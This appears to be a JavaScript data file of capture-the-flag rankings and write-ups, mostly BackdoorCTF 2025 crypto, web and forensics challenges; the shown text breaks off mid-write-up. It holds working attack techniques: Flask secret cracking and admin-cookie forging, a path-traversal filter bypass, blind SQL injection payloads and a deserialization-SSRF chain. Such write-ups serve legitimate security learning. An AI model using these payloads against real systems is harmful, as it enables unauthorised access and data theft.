const ctfData = {
    "VUWCTF 2025": {
        "rank": "26th place",
        "description": "University-level competition with emphasis on practical security challenges.",
        "challenges": []
    },
    "Null CTF 2025": {
        "rank": "62nd place",
        "description": "Community-driven CTF with focus on real-world security scenarios.",
        "challenges": []
    },
    "MetaRed CTF 2025": {
        "rank": "66th place",
        "description": "Specialized competition focusing on red team operations and offensive security techniques.",
        "challenges": []
    },
    "BackdoorCTF 2025": {
        "rank": "79th place",
        "description": "Advanced competition featuring challenging pwn and reverse engineering problems.",
        "challenges": [
            {
                "id": "ambystoma-mexicanum",
                "title": "Ambystoma Mexicanum",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher",
                    "cryptography"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We're given a cryptographic service that uses AES-GCM-SIV encryption. The goal is to make the service output the flag by crafting a ciphertext that, when decrypted with multiple keys, produces the message \"gib me flag plis\".</p>\n<h3>Initial Analysis</h3>\n<p>Looking at the challenge code, the service provides several options:\n1. Rotate key (generates a new random key)\n2. Debug (shows keys, ciphertexts, and nonce)\n3. Push ciphertext (allows us to submit one ciphertext)\n4. Request flag (attempts to verify our message)</p>\n<h4>The Flag Request Logic</h4>\n<p>The critical part of the code is in option 4:</p>\n<pre><code class=\"python\">for i in range(4):\n    key = binascii.unhexlify(KEYS[i % len(KEYS)])\n    ct = binascii.unhexlify(CIPHERTEXTS[i % len(CIPHERTEXTS)])\n<p>text = service.decrypt(ct, key)[16 * i:16 * (i+1)].decode('utf-8').strip()</p>\n<p>if not text or len(text) == 0:\n        print(\"why so rude :(\\n\")\n        exit(0)</p>\n<p>usertext += text</p>\n<p>if usertext == REQUEST:  # REQUEST = \"gib me flag plis\"\n    print(f\"Damn, you are something. Here is the flag: {FLAG}\\n\")\n</code></pre></p>\n<p>This code:\n1. Loops 4 times\n2. Uses modulo to cycle through available keys and ciphertexts\n3. Decrypts the ciphertext with each key\n4. Extracts a different 16-byte slice from each decryption: <code>[0:16]</code>, <code>[16:32]</code>, <code>[32:48]</code>, <code>[48:64]</code>\n5. Strips whitespace and concatenates all chunks\n6. Checks if the result equals \"gib me flag plis\"</p>\n<h3>Finding the Vulnerability</h3>\n<h4>Initial Thoughts</h4>\n<p>At first glance, this seems impossible. With 4 different keys, you'd need:\n<ul>\n<li>A ciphertext that decrypts successfully with all 4 keys (AES-GCM-SIV has authentication!)</li>\n<li>Each decryption producing the right bytes at the right positions</li>\n</ul>\n<h4>The Key Insight</h4></p>\n<p>The breakthrough comes from understanding the modulo operators:\n<ul>\n<li><code>KEYS[i % len(KEYS)]</code> - cycles through available keys</li>\n<li><code>CIPHERTEXTS[i % len(CIPHERTEXTS)]</code> - cycles through available ciphertexts</li>\n</ul>\n<strong>If we DON'T rotate the key</strong>, <code>len(KEYS)</code> remains 1, meaning:\n<ul>\n<li><code>KEYS[0 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[1 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[2 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[3 % 1] = KEYS[0]</code></li>\n</ul>\nAll iterations use the <strong>same key</strong>! And with one ciphertext, all iterations use the <strong>same ciphertext</strong> too!</p>\n<h3>The Solution Strategy</h3>\n<p>Since all iterations use the same key and ciphertext, we just need to:\n1. Create a 64-byte plaintext\n2. Position our target message so each 16-byte extraction gives us the right part\n3. Encrypt it with the single key\n4. Handle the <code>.strip()</code> method carefully</p>\n<h4>Handling <code>.strip()</code></h4>\n<p>The tricky part is that <code>.strip()</code> removes <strong>all leading and trailing whitespace</strong>. The target message is \"gib me flag plis\" (16 characters with spaces between words).</p>\n<p>If we split it as: \"gib \" + \"me \" + \"flag \" + \"plis\", the <code>.strip()</code> will remove trailing spaces, giving us \"gibmeflagplis\" (no spaces).</p>\n<p><strong>Solution</strong>: Split the message so spaces are in the MIDDLE of chunks, where <code>.strip()</code> won't touch them:\n<ul>\n<li>Chunk 0 [0:16]: \"gib m\" (5 chars) + padding</li>\n<li>Chunk 1 [16:32]: \"e fla\" (5 chars) + padding</li>\n<li>Chunk 2 [32:48]: \"g pli\" (5 chars) + padding</li>\n<li>Chunk 3 [48:64]: \"s\" (1 char) + padding</li>\n</ul>\nAfter <code>.strip()</code> and concatenation: \"gib m\" + \"e fla\" + \"g pli\" + \"s\" = \"gib me flag plis\" \u2713</p>\n<h3>Exploit Code</h3>\n<pre><code class=\"python\">from cryptography.hazmat.primitives.ciphers.aead import AESGCMSIV\nimport binascii\n<p>&lt;h2&gt;Get key and nonce from debug option (don't rotate keys!)&lt;/h2&gt;\nKEY_HEX = \"b2e12b64da4c319a037ea801ed0b1eda\"\nNONCE_HEX = \"358cef8f8b551be7b1a3ce2d\"</p>\n<p>TARGET = \"gib me flag plis\"</p>\n<p>key = binascii.unhexlify(KEY_HEX)\nnonce = binascii.unhexlify(NONCE_HEX)\naead = b\"\"</p>\n<p>&lt;h2&gt;Create plaintext with spaces in the middle of chunks&lt;/h2&gt;\nplaintext = b'gib m           '  # -&gt; \"gib m\"\nplaintext += b'e fla           '  # -&gt; \"e fla\"\nplaintext += b'g pli           '  # -&gt; \"g pli\"\nplaintext += b's               '  # -&gt; \"s\"</p>\n<p>&lt;h2&gt;Encrypt&lt;/h2&gt;\ncipher = AESGCMSIV(key)\nciphertext = cipher.encrypt(nonce, plaintext, aead)</p>\n<p>print(f\"Ciphertext: {ciphertext.hex()}\")\n</code></pre></p>\n<h3>Exploitation Steps</h3>\n<p>1. Connect to the service: <code>nc remote.infoseciitr.in 4004</code>\n2. <strong>DON'T</strong> choose option 1 (don't rotate keys!)\n3. Choose option 2 (debug) to get the initial key and nonce\n4. Run the exploit script with the key and nonce\n5. Choose option 3 and paste the generated ciphertext\n6. Choose option 4 to get the flag!</p>\n<h3>Key Takeaways</h3>\n<p>1. <strong>Modulo arithmetic matters</strong>: The use of <code>% len(KEYS)</code> meant we could bypass the multi-key requirement entirely\n2. <strong>Read the code carefully</strong>: The vulnerability wasn't in the crypto itself, but in how the keys were managed\n3. <strong>String manipulation edge cases</strong>: Understanding exactly how <code>.strip()</code> works was crucial for crafting the right plaintext\n4. <strong>Sometimes the simple solution works</strong>: Instead of trying to break AES-GCM-SIV with nonce reuse, the real solution was to avoid using multiple keys at all</p>\n<h3>Flag</h3>\n<p>```\nflag{th3_4x0lo7ls_4r3_n07_wh47_th3y_s33m}</p>\n"
            },
            {
                "id": "bolt-fast",
                "title": "Bolt Fast",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "rsa",
                    "cipher",
                    "cryptography"
                ],
                "writeup": "<h2>CTF Writeup: Need for Speed</h2>\n<h3>Challenge Overview</h3>\n<p>We are given a modified RSA implementation with the following files:\n<ul>\n<li><code>chall.py</code>: The key generation and encryption code</li>\n<li><code>output.txt</code>: The public key (N, e) and ciphertext (c)</li>\n</ul>\nFlag: <code>flag{w31n3r_d1dn7_73ll_y0u_70_b3_6r33dy}</code></p>\n<h3>Vulnerability Analysis</h3>\n<p>Looking at the key generation code in <code>chall.py</code>:</p>\n<pre><code class=\"python\">def flash_key():\n    while True:\n        p = getPrime(1024)\n        q = getPrime(1024)\n        N = p * q\n        dp_smart = getPrime(16)  # Only 16 bits!\n        try:\n            e = inverse(dp_smart, p-1)\n            return N, e, dp_smart\n        except ValueError:\n            continue\n</code></pre>\n<p>The vulnerability is clear: <code>dp_smart</code> is only a 16-bit prime (maximum value ~65536).</p>\n<p>The relationship is: <code>e * dp \u2261 1 (mod p-1)</code></p>\n<p>This means: <code>e * dp = 1 + k * (p-1)</code> for some integer k</p>\n<p>Rearranging: <code>p = (e * dp - 1) / k + 1</code></p>\n<h3>Attack Strategy</h3>\n<p>Since dp is so small (only 16 bits), we can brute force it:</p>\n<p>1. Iterate through all 16-bit primes for dp (roughly 6,500 primes)\n2. For each dp, compute <code>e * dp - 1</code>\n3. Try different values of k to find when <code>(e * dp - 1) / k + 1</code> gives us a valid factor of N\n4. Once we find p, compute q = N / p\n5. Calculate the private key d and decrypt the message</p>\n<h3>Solution Code</h3>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes, isPrime\n<p>N = 22061149554706951873851465765917042279909309233484615798640186468876401527123242297915465375459511054772541825273007749026648641620485458471351811298443479262277231839408201654282927999029324652496830649919637863202844794784443579336735415046336390091671003022244732389217910334465895328371360158510046347031294125509649474722535171601096998732929497780870057433634214228116293166963101489644680801538837005001377764416442380530464289453201654394144682138927826247301956954884930328147978637795259346321547054237005318172528896865428457293207571804464061990459958593520373578234234490804585522859401957032395007142007\ne = 9648003423571638489624579625383119603270189664714210175737275695548206153582516635644990660189908448510652756058045483763071850222529184219333877863638216254054444012130393864033392161426815671725858723096432660521038315432183692553568344247916320931122090436770154203149432285380142051084178668290839858171\nc = 18817014323644102879407569381912044887671193778381872592373573382139976320220125847317309926920208859012582031032930373240219755720268543444729983316326640661427616841700761054678137741340093140586895094016730198447552611014038632666821117758006775144046000049080406858764900680265384743839472653817299383323869146152251839342236631780818396088131196202767951301023089053662813175083035336272981588533957561537975684034210166185396046071368061264321959248372783262788158418696375783427276741258526067168910326630496339287237940444426277757582174810909733937257258767407189452212391936958267819666424558678534741723930</p>\n<p>print(\"Brute forcing 16-bit dp values...\")</p>\n<p>for dp in range(2, 65536):\n    if not isPrime(dp):\n        continue</p>\n<p>edp_minus_1 = e * dp - 1</p>\n<p>for k in range(1, 100000):\n        if edp_minus_1 % k != 0:\n            continue</p>\n<p>p_minus_1 = edp_minus_1 // k\n        p = p_minus_1 + 1</p>\n<p>if p &gt; 1 and p &lt; N and N % p == 0:\n            q = N // p</p>\n<p>if p * q == N:\n                print(f\"Found: dp={dp}, k={k}\")</p>\n<p>phi = (p - 1) * (q - 1)\n                d = pow(e, -1, phi)\n                m = pow(c, d, N)\n                flag = long_to_bytes(m)</p>\n<p>print(f\"FLAG: {flag.decode()}\")\n                exit()\n</code></pre></p>\n"
            },
            {
                "id": "flask-of-cookies",
                "title": "Flask Of Cookies",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http",
                    "flask",
                    "cookie",
                    "reverse",
                    "crack"
                ],
                "writeup": "<h3>Challenge Description</h3>\nA web exploitation challenge involving a Flask application where the goal is to gain administrative access to retrieve a flag.\n<h3>Analysis</h3>\n<h4>Source Code Review</h4>\nThe provided <code>app.py</code> reveals the core logic:\n<pre><code class=\"python\">def derived_level(sess, secret_key):\n    user = sess.get(\"user\", \"\")\n    role = sess.get(\"role\", \"\")\n    if role == \"admin\" and user == secret_key[::-1]:\n        return \"superadmin\"\n    return \"user\"\n<p>@app.route(\"/admin\")\ndef admin():\n    level = derived_level(session, app.secret_key)\n    if level == \"superadmin\":\n        return render_template(\"admin.html\", flag=flag_value)\n    return \"Access denied.\\n\", 403\n</code></pre></p>\n<p>To get the flag, we need to satisfy two conditions in our session:\n1. <code>role</code> must be set to <code>\"admin\"</code>.\n2. <code>user</code> must be the <strong>reverse</strong> of the server's <code>SECRET_KEY</code>.</p>\n<h4>The Problem</h4>\nThe <code>SECRET_KEY</code> is loaded from the environment variables. The local <code>.env</code> file provided in the download contained a placeholder (<code><fake_secret_key></code>), which does not work on the remote server.\n<p>There was a misleading string in the EXIF data of <code>static/cookie.jpg</code> (<code>fPCwmvV/0a2Rul8RgRsZdaiP8Pfn1EvJXXrJLvSwmAM=</code>), but this turned out to be a rabbit hole (or a hash of a key we couldn't easily crack).</p>\n<h3>Exploitation</h3>\n<h4>1. Obtaining the Secret Key</h4>\nSince we have a valid session cookie from the server (by visiting the homepage), and the server is likely using a weak secret key, we can attempt to brute-force it using <code>flask-unsign</code>.\n<p><strong>Command:</strong>\n<pre><code class=\"bash\">flask-unsign --unsign --cookie \"&lt;server_cookie&gt;\" --wordlist /usr/share/wordlists/rockyou.txt\n</code></pre></p>\n<p><strong>Result:</strong>\nThe tool successfully cracks the signature and reveals the secret key: <code>qwertyuiop</code>.</p>\n<h4>2. Forging the Admin Cookie</h4>\nWith the secret key (<code>qwertyuiop</code>), we can now forge a valid session cookie that satisfies the exploit conditions.\n<ul>\n<li>  <strong>Secret Key:</strong> <code>qwertyuiop</code></li>\n<li>  <strong>Target Role:</strong> <code>admin</code></li>\n<li>  <strong>Target User:</strong> <code>poiuytrewq</code> (The secret key reversed)</li>\n</ul>\n<strong>Forge Script:</strong>\n<pre><code class=\"python\">from flask.sessions import SecureCookieSessionInterface\nfrom flask import Flask\n<p>app = Flask(__name__)\napp.secret_key = \"qwertyuiop\"</p>\n<p>session_interface = SecureCookieSessionInterface()\nserializer = session_interface.get_signing_serializer(app)</p>\n<p>session_data = {\"user\": \"poiuytrewq\", \"role\": \"admin\"}\ncookie_val = serializer.dumps(session_data)</p>\n<p>print(f\"Forged Cookie: {cookie_val}\")\n</code></pre></p>\n<h4>3. Retrieving the Flag</h4>\nWe send the forged cookie to the <code>/admin</code> endpoint.\n<p><strong>Command:</strong>\n<pre><code class=\"bash\">curl -H \"Cookie: session=&lt;forged_cookie&gt;\" http://104.198.24.52:6011/admin\n</code></pre></p>\n<p><strong>Response:</strong>\nThe server accepts the cookie as valid superadmin credentials and returns the page containing the flag.</p>\n<h3>Flag</h3>\n<pre><code class=\"\">flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}\n</code></pre>\n"
            },
            {
                "id": "fractonacci",
                "title": "Fractonacci",
                "category": "Forensics",
                "tags": [
                    "image",
                    "forensics"
                ],
                "writeup": "<h3>Challenge Description</h3>\n\"Beautiful. Red. Fractonacci. What could this mean??\"\nWe are provided with an image <code>fractonacci.png</code>.\n<h3>Solution</h3>\n<p>1. <strong>Analysis</strong>:\n<ul>\n<li>The image is a large PNG (6000x6000).</li>\n<li>The name \"Fractonacci\" suggests a connection to Fractals and Fibonacci numbers.</li>\n<li>The hint \"Red\" suggests looking at the Red color channel.</li>\n</ul>\n2. <strong>Extraction</strong>:\n<ul>\n<li>We extracted the Red channel data from the image.</li>\n<li>Using <code>imagemagick</code>:</li>\n</ul>\n     <pre><code class=\"bash\">     convert challenge.png -channel R -separate -depth 8 red.gray\n     </code></pre></p>\n<p>3. <strong>Decoding</strong>:\n<ul>\n<li>We wrote a Python script to analyze the raw bytes of the Red channel (<code>red.gray</code>).</li>\n<li>Following the \"Fibonacci\" hint, we examined the byte values at indices corresponding to the Fibonacci sequence (1, 2, 3, 5, 8, 13, ...).</li>\n<li>The sequence $F_n$ where $F_0=0, F_1=1, F_{n}=F_{n-1}+F_{n-2}$.</li>\n<li>We extracted bytes at indices: 1, 2, 3, 5, 8, 13, 21, ...</li>\n</ul>\n4. <strong>Result</strong>:\n<ul>\n<li>The extracted characters formed the string: <code>lag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code>.</li>\n<li>Prepending the missing 'f' (which would correspond to a theoretical earlier index or just implied), we get the complete flag.</li>\n</ul>\n<h3>Flag</h3>\n<code>flag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code></p>\n"
            },
            {
                "id": "image-gallery",
                "title": "Image Gallery",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "http",
                    "image",
                    "web"
                ],
                "writeup": "<p>Analysis:\n1.  <strong>Source Code Review</strong>: The challenge provides a source code archive (<code>gallery.zip</code>). Analyzing <code>server.js</code>, we find an express server with an endpoint <code>/image</code>.\n2.  <strong>Vulnerable Endpoint</strong>: The <code>/image</code> endpoint takes a <code>file</code> query parameter to serve images from the <code>images</code> directory (<code>BASE_DIR</code>).\n    <pre><code class=\"javascript\">    const BASE_DIR = path.join(__dirname, 'images');\n    // ...\n    app.get('/image', (req, res) =&gt; {\n      let file = req.query.file || '';\n      // ...\n      file = file.replace(/\\\\/g, '/');\n      file = file.split('../').join(''); // Vulnerable sanitization\n      const resolved = path.join(BASE_DIR, file);\n      // ...\n      fs.readFile(resolved, (err, data) =&gt; { ... });\n    });\n    </code></pre>\n3.  <strong>Sanitization Flaw</strong>: The code attempts to prevent path traversal by removing <code>../</code> using <code>split('../').join('')</code>. However, this is not recursive. It effectively removes all occurrences of <code>../</code> present *initially*, but does not check if new <code>../</code> sequences are formed *after* the removal.</p>\n<p>Exploit:\n1.  <strong>Bypassing the Filter</strong>: If we send the string <code>....//</code>, the code splits it by <code>../</code>.\n<ul>\n<li>  <code>\"....//\".split('../')</code> results in <code>[\"..\", \"/\"]</code>.</li>\n<li>  Joining them back together results in <code>../</code>.</li>\n</ul>\n2.  <strong>Target File</strong>: The file structure shows a <code>secret</code> directory at the same level as <code>images</code>.\n<ul>\n<li>  <code>gallery/images/</code> (Base Directory)</li>\n<li>  <code>gallery/secret/flag.txt</code></li>\n</ul>\n3.  <strong>Payload</strong>: To access <code>../secret/flag.txt</code>, we can use <code>....//secret/flag.txt</code>.\n4.  <strong>Execution</strong>:\n    <pre><code class=\"bash\">    curl \"http://104.198.24.52:6012/image?file=....//secret/flag.txt\"\n    </code></pre>\n    Response:\n    <pre><code class=\"\">    flag{sTr1pp1ng_d0Ts_and_SLasH3s_d03sNt_sTr1p_bUgs}\n    </code></pre></p>\n"
            },
            {
                "id": "marketflow",
                "title": "Marketflow",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "web",
                    "http"
                ],
                "writeup": "<h4>Vulnerability Analysis</h4>\n<p>1.  <strong>Insecure Deserialization:</strong>\n<ul>\n<li>  The endpoint <code>/api/analytics/reports</code> accepts a JSON payload and processes it using <code>ObjectManager.deserialize</code>.</li>\n<li>  This method allows instantiating any class registered in <code>CLASS_REGISTRY</code> with arbitrary constructor arguments.</li>\n<li>  This is the entry point for the exploit chain.</li>\n</ul>\n2.  <strong>Arbitrary File Write (Gadget Chain):</strong>\n<ul>\n<li>  The <code>Scheduler</code> processes tasks and, for <code>ReportConfiguration</code> objects, can trigger <code>cache_service.prime(output_config)</code>.</li>\n<li>  <code>CacheService.prime</code> calls <code>config.persistence.write(data)</code>.</li>\n<li>  <code>PersistenceAdapter.write</code> (the persistence object) uses <code>os.path.join</code> with user-controlled input. If an absolute path or path traversal (e.g., <code>../</code>) is provided, it can write to unintended locations.</li>\n<li>  This allows us to write arbitrary content to files in the writable directories (specifically <code>/var/tmp/sessionmaze/templates</code> via traversal).</li>\n</ul>\n3.  <strong>SSRF (Trigger Mechanism):</strong>\n<ul>\n<li>  The <code>Scheduler</code> only processes tasks when <code>/internal/cron/process</code> is called. This endpoint is restricted to <code>localhost</code>.</li>\n<li>  The <code>/api/webhooks/forward</code> endpoint uses <code>WebhookForwarder</code> to make HTTP requests.</li>\n<li>  Although there is a protection mechanism (<code>is_safe_url</code>), it can be bypassed using a domain that resolves to 127.0.0.1 (e.g., <code>localtest.me</code>). This allows us to trigger the cron job externally.</li>\n</ul>\n4.  <strong>Local File Inclusion (LFI):</strong>\n<ul>\n<li>  The <code>TemplateRenderer</code> has a \"legacy\" mode for files ending in <code>.tpl</code>.</li>\n<li>  If a template contains <code>@config: /path/to/file</code>, the renderer reads that file and includes its content in the output HTML.</li>\n<li>  By writing a malicious <code>.tpl</code> file (using the file write vulnerability) and then instructing the application to use it as a template, we can read <code>/flag.txt</code>.</li>\n</ul>\n<h4>Exploit Summary</h4></p>\n<p>I created and executed an exploit script (<code>exploit.py</code>) that performed the following steps:\n1.  <strong>Register & Login:</strong> Created a user to access the authenticated API.\n2.  <strong>Stage 1 (Write):</strong> Scheduled a malicious task to write a file named <code>exploit.tpl</code> to <code>../templates/exploit.tpl</code> (which resolves to <code>/var/tmp/sessionmaze/templates/exploit.tpl</code>). The content included <code>@config: /flag.txt</code>.\n3.  <strong>Trigger:</strong> Used the SSRF vulnerability to hit <code>http://localtest.me:5000/internal/cron/process</code>, forcing the scheduler to execute the write task.\n4.  <strong>Stage 2 (Read):</strong> Scheduled a second task to generate a report using the <code>exploit.tpl</code> template.\n5.  <strong>Trigger:</strong> Triggered the scheduler again.\n6.  <strong>Retrieve:</strong> Downloaded the generated report. The flag was embedded in an HTML comment within the report.</p>\n<h4>Flag</h4>\n<p><code>flag{n3st3d_d3s3r1al1z4t10n_ssrf_ch41n_c0mpl3t3_0b53wrf}</code></p>\n"
            },
            {
                "id": "no-sight",
                "title": "No Sight",
                "category": "Web Exploitation",
                "tags": [
                    "sql",
                    "injection",
                    "web"
                ],
                "writeup": "<h3>Reconnaissance</h3>\n1.  <strong>Initial Probing</strong>:\n<ul>\n<li>  Input <code>1</code> -> \"User found!\"</li>\n<li>  Input <code>999999</code> -> \"No user found\"</li>\n</ul>\n2.  <strong>Vulnerability Detection</strong>:\n<ul>\n<li>  We suspected SQL Injection.</li>\n<li>  Input <code>1 AND 1=1</code> -> \"User found!\" (True condition)</li>\n<li>  Input <code>1 AND 1=2</code> -> \"No user found\" (False condition)</li>\n<li>  This confirmed a <strong>Boolean-based Blind SQL Injection</strong> vulnerability. We can ask the database true/false questions and infer data based on the response.</li>\n</ul>\n<h3>Database Enumeration</h3>\n1.  <strong>Identifying the Database</strong>:\n<ul>\n<li>  Standard MySQL functions like <code>database()</code> and <code>version()</code> failed or were filtered.</li>\n<li>  We tested for SQLite by querying the <code>sqlite_master</code> table.</li>\n<li>  Payload: <code>1 AND (SELECT 1 FROM sqlite_master LIMIT 1) = 1</code> -> \"User found!\"</li>\n<li>  This confirmed the database is <strong>SQLite</strong>.</li>\n</ul>\n2.  <strong>Finding Tables</strong>:\n<ul>\n<li>  We knew there was likely a <code>users</code> table.</li>\n<li>  To find the flag, we searched for other tables. We checked for a second table in <code>sqlite_master</code>.</li>\n<li>  We wrote a Python script using binary search to extract the name of the table that is NOT 'users'.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(name, 1, 1) FROM sqlite_master WHERE type='table' AND name != 'users' LIMIT 1) > 'char'</code></li>\n<li>  The script revealed a table named: <code>secret_flags</code>.</li>\n</ul>\n3.  <strong>Finding Columns</strong>:\n<ul>\n<li>  We needed to know the column names in <code>secret_flags</code>.</li>\n<li>  We extracted the <code>CREATE TABLE</code> SQL statement for the <code>secret_flags</code> table from <code>sqlite_master</code>.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(sql, 1, 1) FROM sqlite_master WHERE type='table' AND name='secret_flags') > 'char'</code></li>\n<li>  The result was:</li>\n</ul>\n        <pre><code class=\"sql\">        CREATE TABLE secret_flags (\n            id INTEGER PRIMARY KEY,\n            flag TEXT NOT NULL\n        )\n        </code></pre>\n<ul>\n<li>  This confirmed the target column is <code>flag</code>.</li>\n</ul>\n<h3>Exploitation</h3>\n1.  <strong>Extracting the Flag</strong>:\n<ul>\n<li>  With the table <code>secret_flags</code> and column <code>flag</code> identified, we wrote a final Python script to extract the flag's content character by character.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(flag, 1, 1) FROM secret_flags LIMIT 1) > 'char'</code></li>\n<li>  The script used binary search for efficiency.</li>\n</ul>\n<h3>Result</h3>\nThe extraction script successfully recovered the flag:\n<p><strong>Flag</strong>: <code>flag{bl1nd_but_n0t_l0st_1n_th3_d4rk}</code></p>\n"
            },
            {
                "id": "peak-conjecture",
                "title": "Peak Conjecture",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "pwn",
                    "reverse",
                    "cryptography"
                ],
                "writeup": "<p>chall.py analysis:\nThe core of the challenge revolved around a function <code>uniqueHash(x)</code> which calculates the number of steps required for <code>x</code> to reach 1 according to the Collatz conjecture (3x+1 problem), with a cap of 10000 steps.</p>\n<p>The server's logic:\n1. It has a secret <code>message</code> (likely a bytes-to-long converted flag).\n2. It calculates <code>myHash = uniqueHash(message)</code>.\n3. It prints <code>uniqueHash(myHash)</code> to the user.\n4. It then asks the user to input 10 distinct integers <code>x</code> such that:\n<ul>\n<li><code>uniqueHash(x) == myHash</code></li>\n<li><code>isPrime(x) == isPrime(message)</code></li>\n</ul>\n5. If 10 such numbers are provided, it reveals <code>message</code> (the flag).</p>\n<p>Initial Interaction and Deduction:\nUpon connecting to the server using <code>nc remote.infoseciitr.in 4002</code>, the server output:\n\"This is my hash of hash: 25\"</p>\n<p>This means <code>uniqueHash(myHash) = 25</code>.\n<code>myHash</code> is itself an integer representing a number of Collatz steps. Since <code>uniqueHash(myHash) = 25</code>, it means <code>myHash</code> is an integer that takes 25 steps to reach 1 in the Collatz sequence.</p>\n<p>Strategy:\n1.  <strong>Find <code>myHash</code>:</strong> We need to find <code>S</code> such that <code>uniqueHash(S) = 25</code>. Since <code>myHash</code> is a step count, it's likely a relatively small integer (usually < 10000). We can iterate through integers <code>S</code> from 1 to 10000 and calculate <code>uniqueHash(S)</code>. The initial solver script performed this, finding a list of candidates for <code>myHash</code>. The first successful probe revealed <code>myHash = 4017</code>.\n2.  <strong>Determine <code>isPrime(message)</code>:</strong> To satisfy <code>isPrime(x) == isPrime(message)</code>, we need to know the primality of <code>message</code>. By sending a known composite number <code>x</code> (e.g., <code>2^4017</code>) that satisfies <code>uniqueHash(x) == 4017</code>, we can observe the server's response.\n<ul>\n<li>If the server says \"Correct!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are the same. Since <code>x</code> is composite, <code>message</code> is composite.</li>\n<li>If the server says \"Well Well, you failed!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are different. Since <code>x</code> is composite, <code>message</code> is prime.</li>\n</ul>\n    My solver found <code>myHash = 4017</code> and determined that <code>message</code> is prime.\n3.  <strong>Generate 10 inputs:</strong> We need to find 10 distinct prime numbers <code>x</code> such that <code>uniqueHash(x) == 4017</code>.\n    To do this, we can reverse the Collatz sequence from 1 for <code>4017</code> steps. The reverse operations are:\n<ul>\n<li><code>v -> 2 * v</code> (always valid)</li>\n<li><code>v -> (v - 1) / 3</code> (valid if <code>(v - 1)</code> is divisible by 3 and <code>(v - 1) / 3</code> is odd and greater than 1).</li>\n</ul>\n    Since <code>4017</code> steps is a large number, the resulting <code>x</code> values will be very large (thousands of bits long). The density of primes among such large numbers is low (approximately <code>1 / ln(N)</code>). Therefore, we need to generate a large number of candidates and test their primality.</p>\n<p>Solver Implementation:\nMy Python solver script used the <code>pwn</code> library for network interaction and <code>Crypto.Util.number.isPrime</code> for primality testing.</p>\n<p>The key steps in the solver were:\n<ul>\n<li>  <strong><code>uniqueHash(x)</code> function:</strong> A local re-implementation of the server's Collatz hash function.</li>\n<li>  <strong><code>generate_inputs(target_steps, beam_width, forbidden)</code> function:</strong> This function generates numbers that have a specific <code>target_steps</code> in their Collatz sequence. It works by starting from 1 and reversing the Collatz operations for <code>target_steps</code> iterations. To handle the exponential growth, it uses a <code>beam_width</code> to limit the number of active paths at each step, taking a random sample if the paths exceed the beam width.</li>\n<li>  <strong>Pre-calculation of primes:</strong> To avoid server timeouts, the solver first generated <code>myHash</code> (4017) and <code>isPrime(message)</code> (True). Then, it locally generated a large set of candidates using <code>generate_inputs(4017, 60000, [])</code>. From these candidates, it filtered out and stored 10 distinct prime numbers.</li>\n<li>  <strong>Server Interaction:</strong> After pre-calculating the primes, the solver connected to the remote server, read the initial prompt, and then sent the 10 pre-calculated primes one by one. The server responded with \"Correct!\" for each valid input.</li>\n<li>  <strong>Flag Retrieval:</strong> After the 10th correct input, the server printed the flag.</li>\n</ul>\nChallenges and Refinements:\n<ul>\n<li>  <strong><code>Cryptodome</code> vs <code>Crypto</code>:</strong> The <code>chall.py</code> used <code>Cryptodome.Util.number.isPrime</code>, while <code>pycryptodome</code> typically installs as <code>Crypto</code>. This was fixed by changing the import in the solver.</li>\n<li>  <strong>Server Timeout:</strong> The server seemed to have an idle timeout or processing timeout. Initially, my solver performed the <code>myHash</code> and primality probing, and then the prime generation *after* connecting to the server. This often led to an <code>EOFError</code> because the generation took too long. The solution was to perform all computationally intensive tasks (like generating prime candidates) locally *before* establishing the connection to the remote server.</li>\n<li>  <strong>Generating Enough Primes:</strong> Finding 10 primes with a specific, large Collatz stopping time requires exploring a wide range of numbers. Initially, my <code>beam_width</code> for candidate generation was too small, yielding fewer than 10 primes. Increasing the <code>beam_width</code> (e.g., to 60000) allowed the generator to produce enough candidates to find the required 10 primes.</li>\n</ul>\nFlag:\n<code>flag{1r0n_m4n_f0r_c0ll4tz_3ndg4m3_0f_cryp70gr4phy_1s_p34k_r16h7_313}</code></p>\n"
            },
            {
                "id": "the-job",
                "title": "The Job",
                "category": "Cryptography",
                "tags": [
                    "pwn",
                    "reverse",
                    "cryptography"
                ],
                "writeup": "<p>Phase 1: Balancing the Initial Hash Table\n1.  Understanding the Requirement: The server provided 896 unique numbers and expected a polynomial $P(x)$ whose coefficients we would provide. The hash function was $H(x) = P(x) \\pmod{10^9+7}$. This hash was used to place numbers into 256 slots. The manager demanded that the inputs be \"equally divided,\" meaning the difference in sizes of any two slots should not be 2 or more.\n2.  Determining the Target Distribution: With $N=896$ numbers and $K=256$ slots, the average number of items per slot is $896/256 = 3.5$. To satisfy the \"difference in sizes of any two slots should not be 2 or more\" constraint and the maximum size limit of 4 items per slot (derived from <code>(N+K-1)/K</code> check), the only valid distribution is to have exactly 128 slots containing 3 items and 128 slots containing 4 items.\n3.  Polynomial Construction (Lagrange Interpolation): We needed to find a polynomial $P(x)$ such that for each given number $x_i$ from the leaked <code>number_array</code>, $P(x_i) \\pmod{MOD}$ resulted in a specific target slot index $y_i$. We constructed a mapping where 128 input numbers were assigned to each of the 128 \"size 4\" slots, and 128 input numbers were assigned to each of the 128 \"size 3\" slots. We then used Lagrange Interpolation over a finite field ($MOD = 10^9+7$) to determine the coefficients of this polynomial. The polynomial's degree was $N-1$, which was acceptable. The <code>solve_poly</code> function implemented this, returning the coefficients in a low-to-high degree order, which were then reversed before sending.</p>\n<p>Phase 2: Finding the Hidden Junk Value\n1.  The Twist: After Phase 1, the server revealed that a \"junk\" value was already placed in a random, unknown slot (<code>target</code>). This meant one slot would start with 1 item, and the others with 0. We had 6 trials 